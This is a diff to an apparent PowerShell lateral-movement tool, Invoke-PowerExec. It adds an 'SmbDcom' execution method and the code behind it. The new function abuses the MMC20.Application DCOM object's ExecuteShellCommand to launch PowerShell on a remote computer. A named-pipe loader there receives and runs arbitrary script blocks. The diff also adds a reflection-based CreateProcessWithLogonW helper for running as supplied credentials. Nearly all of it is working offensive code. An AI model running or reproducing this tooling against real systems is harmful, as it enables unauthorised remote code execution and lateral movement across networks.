@@ -80,7 +80,7 @@ Function Invoke-PowerExec {
         [String]
         $Authentication = 'Default',
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'SmbDcom', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -534,7 +534,7 @@ Function Local:New-PowerExec {
         [String]
         $Authentication = 'Default',
 
-        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'WinRM')]
+        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'SmbTask', 'SmbDcom', 'WinRM')]
         [String]
         $Method = 'CimProcess',
 
@@ -667,7 +667,15 @@ Function Local:New-PowerExec {
             try {
                 $output = Invoke-SmbTask -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
             }
-            catch [Management.Automation.RuntimeException] {
+            catch {
+                Write-Warning "[$ComputerName] Execution failed. $_"
+            }
+        }
+        'SmbDcom' {
+            try {
+                $output = Invoke-SmbDcom -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
+            }
+            catch {
                 Write-Warning "[$ComputerName] Execution failed. $_"
             }
         }
@@ -1349,6 +1357,158 @@ function Local:Invoke-SmbTask {
             Write-Verbose "[SMBEXEC] Unregistering scheduled task $TaskName..."
             $scheduleTaskFolder.DeleteTask($scheduledTask.Name, 0) | Out-Null
         }
+
+        if ($logonToken) {
+            Invoke-RevertToSelf -TokenHandle $logonToken
+        }
+    }
+}
+
+function Local:Invoke-SmbDcom {
+    [CmdletBinding()]
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerName = $env:COMPUTERNAME,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $PipeName = [guid]::NewGuid().Guid
+    )
+
+    Begin {
+        Function Local:Invoke-UserProcess {
+            [CmdletBinding()]
+            Param (
+                [Parameter(Mandatory = $True)]
+                [Management.Automation.PSCredential]
+                [Management.Automation.CredentialAttribute()]
+                $Credential,
+
+                [Parameter(Mandatory = $True)]
+                [String]
+                $Command
+            )
+            $networkCredential = $Credential.GetNetworkCredential()
+            $userDomain = $networkCredential.Domain
+            $userName = $networkCredential.UserName
+            $password = $networkCredential.Password
+            $systemModule = [Microsoft.Win32.IntranetZoneCredentialPolicy].Module
+            $nativeMethods = $systemModule.GetType('Microsoft.Win32.NativeMethods')
+            $safeNativeMethods = $systemModule.GetType('Microsoft.Win32.SafeNativeMethods')
+            $CreateProcessWithLogonW = $nativeMethods.GetMethod('CreateProcessWithLogonW', [Reflection.BindingFlags] 'NonPublic, Static')
+            $LogonFlags = $nativeMethods.GetNestedType('LogonFlags', [Reflection.BindingFlags] 'NonPublic')
+            $StartupInfo = $nativeMethods.GetNestedType('STARTUPINFO', [Reflection.BindingFlags] 'NonPublic')
+            $ProcessInformation = $safeNativeMethods.GetNestedType('PROCESS_INFORMATION', [Reflection.BindingFlags] 'NonPublic')
+            $flags = [Activator]::CreateInstance($LogonFlags)
+            $flags.value__ = 2 # LOGON_NETCREDENTIALS_ONLY
+            $startInfo = [Activator]::CreateInstance($StartupInfo)
+            $procInfo = [Activator]::CreateInstance($ProcessInformation)
+            $passwordStr = ConvertTo-SecureString $password -AsPlainText -Force
+            $passwordPtr = [Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($passwordStr)
+            $strBuilder = New-Object System.Text.StringBuilder
+            $strBuilder.Append($Command) | Out-Null
+            $result = $CreateProcessWithLogonW.Invoke($null, @([String] $userName,
+                                                    [String] $userDomain,
+                                                    [IntPtr] $passwordPtr,
+                                                    ($flags -as $LogonFlags),
+                                                    $null,
+                                                    [Text.StringBuilder] $strBuilder,
+                                                    0x08000000,
+                                                    $null,
+                                                    $null,
+                                                    $startInfo,
+                                                    $procInfo))
+            if (-not $result) {
+                Write-Error "Unable to create process as user $userName."
+            }
+        }
+
+        $loader = ''
+        $loader += '$s = new-object IO.Pipes.NamedPipeServerStream(''' + $PipeName + ''', 3); '
+        $loader += '$s.WaitForConnection(); '
+        $loader += '$r = new-object IO.StreamReader $s; '
+        $loader += '$x = ''''; '
+        $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
+        $loader += '$z = [ScriptBlock]::Create($x); '
+        $loader += '& $z'
+        $arguments = '/c powershell -NoP -NonI -C "' + $loader + '"'
+
+        $script = ''
+        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
+        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
+        $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
+        $script += '$writer = [IO.StreamWriter]::new($s)' + [Environment]::NewLine
+        $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
+        $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
+        $script += '$writer.Dispose()' + [Environment]::NewLine
+        $script += '$r.Dispose()' + [Environment]::NewLine
+        $script += '$s.Dispose()' + [Environment]::NewLine
+        $script = $script -creplace '(?m)^\s*\r?\n',''
+        $payload = [char[]] $script
+    }
+
+    Process {
+        if ($Credential.UserName) {
+            Write-Verbose "[SMBEXEC] Running command..."
+            Write-Debug "%COMSPEC% $arguments"
+            $script = ''
+            $script += '$obj = [Activator]::CreateInstance([Type]::GetTypeFromProgID(''MMC20.Application'', ''' + $ComputerName + '''));'
+            $script += '$obj.Document.ActiveView.ExecuteShellCommand(''%COMSPEC%'', $null, ''' + $arguments.Replace("'","''") + ''', ''7'')'
+            try {
+                Invoke-UserProcess -Credential $Credential -Command ('powershell.exe -NoP -NonI -C "' + $script.Replace('"','""') + '"')
+            }
+            catch {
+                Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
+                break
+            }
+        }
+        else {
+            try {
+                $com = [Type]::GetTypeFromProgID("MMC20.Application", $ComputerName)
+                $obj = [Activator]::CreateInstance($com)
+            }
+            catch {
+                Write-Error "[SMBEXEC] Unable to access $ComputerName. $_"
+                break
+            }
+            Write-Verbose "[SMBEXEC] Running command..."
+            Write-Debug "%COMSPEC% $arguments"
+            $obj.Document.ActiveView.ExecuteShellCommand('%COMSPEC%', $null, $arguments, '7')
+        }
+
+        Write-Verbose "[SMBEXEC] Connecting to named pipe server \\$ComputerName\pipe\$PipeName..."
+        if ($Credential.UserName) {
+            $logonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+        $pipeTimeout = 10000 # 10s
+        $pipeClient = New-Object IO.Pipes.NamedPipeClientStream($ComputerName, $PipeName, [IO.Pipes.PipeDirection]::InOut, [IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Impersonation)
+        $pipeClient.Connect($pipeTimeout)
+        Write-Verbose "[SMBEXEC] Delivering payload..."
+        $writer = New-Object IO.StreamWriter($pipeClient)
+        $writer.AutoFlush = $true
+        $writer.WriteLine($payload)
+        Write-Verbose "[SMBEXEC] Getting execution output..."
+        $reader = New-Object IO.StreamReader($pipeClient)
+        $output = ''
+        while (($data = $reader.ReadLine()) -ne $null) {
+            $output += $data + [Environment]::NewLine
+        }
+        Write-Output ([Management.Automation.PSSerializer]::Deserialize($output))
+    }
+
+    End {
+        $reader.Dispose()
+        $pipeClient.Dispose()
 
         if ($logonToken) {
             Invoke-RevertToSelf -TokenHandle $logonToken
